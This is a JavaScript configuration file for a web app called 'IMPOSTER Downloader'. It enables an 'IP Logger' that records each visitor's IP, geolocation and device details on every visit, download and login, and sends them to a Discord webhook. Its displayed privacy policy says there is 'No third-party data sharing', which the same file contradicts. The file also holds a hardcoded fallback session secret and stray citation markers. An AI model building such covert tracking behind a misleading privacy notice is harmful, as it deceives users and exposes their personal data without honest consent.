// config.js - IMPOSTER Downloader Configuration
require('dotenv').config();

module.exports = {
    // Server Settings
    server: {
        port: process.env.PORT || 3000,
        sessionSecret: process.env.SESSION_SECRET || 'imposter-secret-key-2027',
        tempDir: process.env.RENDER ? '/tmp/imposter-downloader' : './temp'
    },
    
    // Discord OAuth2 Settings [citation:2]
    discord: {
        clientId: process.env.DISCORD_CLIENT_ID || 'YOUR_CLIENT_ID_HERE',
        clientSecret: process.env.DISCORD_CLIENT_SECRET || 'YOUR_CLIENT_SECRET_HERE',
        redirectUri: process.env.DISCORD_REDIRECT_URI || 'https://your-app.onrender.com/auth/discord/callback',
        scopes: ['identify', 'email'], // Request user info [citation:4]
        botToken: process.env.DISCORD_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE',
        logChannelId: process.env.DISCORD_LOG_CHANNEL || 'YOUR_CHANNEL_ID_HERE'
    },
    
    // Discord Webhook for IP Logging [citation:1]
    webhook: {
        enabled: true,
        url: process.env.DISCORD_WEBHOOK_URL || 'YOUR_WEBHOOK_URL_HERE'
    },
    
    // IP Logger Settings [citation:7]
    ipLogger: {
        enabled: true,
        logAllVisits: true,
        logDownloads: true,
        logLogins: true,
        geoLocation: true, // Get country/city from IP
        userAgentParsing: true // Get device/browser info
    },
    
    // Modal Content
    modals: {
        about: {
            title: '👨‍💻 About IMPOSTER',
            content: `IMPOSTER Downloader is a universal media downloader created by a team of developers passionate about making content accessible.\n\nVersion: 5.0.0\nReleased: 2026\nPlatforms: 1000+ supported`
        },
        dev: {
            title: '⚡ Dev: Rick',
            content: `Rick is the lead developer behind IMPOSTER Downloader.\n\n🔧 Full Stack Developer\n🎮 Discord Bot Specialist\n🌐 Web Security Enthusiast\n📅 Coding since 2020\n\nContact: @rick_dev (Discord)`
        },
        privacy: {
            title: '🔒 Privacy Policy',
            content: `IMPOSTER Downloader respects your privacy.\n\n• We collect IP addresses for analytics and abuse prevention\n• Login data is stored securely\n• No third-party data sharing\n• Files are deleted immediately after download\n• Cookies used for session management only\n\nLast updated: 2026-2027`
        },
        terms: {
            title: '📜 Terms of Service',
            content: `By using IMPOSTER Downloader you agree to:\n\n• Only download content you have rights to\n• Not abuse the service for illegal purposes\n• Rate limits apply (3 downloads/minute)\n• We reserve the right to block abusive IPs\n• Service provided "as is" without warranties\n\n© IMPOSTER 2026-2027`
        }
    }
};
